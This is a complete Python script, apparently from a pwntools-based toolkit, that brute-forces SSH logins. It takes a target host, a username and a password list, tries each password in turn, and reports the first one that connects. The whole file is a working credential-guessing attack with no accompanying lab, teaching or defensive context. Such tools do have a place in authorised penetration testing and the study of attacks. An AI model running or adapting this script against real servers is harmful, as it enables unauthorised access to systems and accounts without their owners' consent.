#!/usr/bin/env python
from pwn import *
import paramiko
import sys
import argparse
parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
parser.add_argument("-u", "--user", help="Host username.")
args = parser.parse_args()
host = args.host
passlist = args.passlist
username = args.user
attempts = 0
print(passlist)
with open(passlist,"r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts +=1
